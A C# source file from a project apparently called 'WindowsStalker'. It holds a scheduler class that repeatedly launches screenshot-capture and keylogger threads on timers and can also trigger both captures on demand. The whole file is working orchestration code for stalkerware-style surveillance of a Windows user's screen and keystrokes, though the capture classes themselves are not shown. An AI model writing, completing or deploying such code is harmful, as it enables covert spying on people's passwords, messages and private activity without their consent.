using System;
using System.Diagnostics;
using System.Threading;

namespace WindowsStalker
{
    public class Scheduler
    {
        private int _screenshotPeriod = 30;
        private int _keyloggerPeriod = 30;
        private Thread _captureThread;
        private volatile bool _shouldStop;

        public void ScheduleFilesCapture()
        {
            Stopwatch screenshotStopwatch = new Stopwatch();
            Stopwatch keyloggerStopwatch = new Stopwatch();
            screenshotStopwatch.Start();
            keyloggerStopwatch.Start();

            Console.WriteLine("scheduler started");

            while (!_shouldStop)
            {
                if(screenshotStopwatch.Elapsed >= TimeSpan.FromSeconds(_screenshotPeriod))
                {
                    screenshotStopwatch.Stop();
                    Console.WriteLine("new capture screenshot task starded");
                    StartScreenshotThread();
                    screenshotStopwatch = new Stopwatch();
                    screenshotStopwatch.Start();
                }
                if (keyloggerStopwatch.Elapsed >= TimeSpan.FromSeconds(_keyloggerPeriod))
                {
                    keyloggerStopwatch.Stop();
                    Console.WriteLine("new capture keypress task starded");
                    StartKeyloggerThread();
                    keyloggerStopwatch = new Stopwatch();
                    keyloggerStopwatch.Start();
                }
            }
            Console.WriteLine("Schedule thread terminating...");
        }

        public void UpdateConfiguration(int screenshotPeriod, int keyloggerPeriod)
        {
            _shouldStop = true;
            _captureThread.Join();
            Console.WriteLine("Current scheduling thread terminated");
            _screenshotPeriod = screenshotPeriod;
            _keyloggerPeriod = keyloggerPeriod;

            _shouldStop = false;
            Console.WriteLine("Starting new scheduling thread...");
            StartScheduling();
        }

        public void StartScheduling()
        {
            _captureThread = new Thread(ScheduleFilesCapture);
            _captureThread.Start();
        }

        public void CaptureOnDemand()
        {
            StartScreenshotThread();
            StartKeyloggerThread();
        }

        private void StartScreenshotThread()
        {
            Thread screenshotThread = new Thread(ScreenCapture.CaptureScreenshot);
            screenshotThread.Start();
        }

        private void StartKeyloggerThread()
        {
            Thread keyloggerThread = new Thread(Keylogger.LogKeys);
            keyloggerThread.Start();
        }
    }
}